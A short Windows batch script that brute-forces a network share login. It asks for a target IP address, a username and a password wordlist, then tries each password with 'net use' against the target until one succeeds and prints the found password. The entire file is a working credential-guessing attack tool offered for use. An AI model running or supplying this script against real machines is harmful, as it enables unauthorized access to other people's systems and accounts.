@echo off
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

for /f %%a in (%wordlist%) do (
 set pass=%%a
 call :attempt
)
echo Password no Found :(
pause
exit

:success
echo Password Found!: %pass%
pause
exit

:attempt
net use \\%ip% /user:%user% %pass%
if %errorlevel% EQU 0 goto success
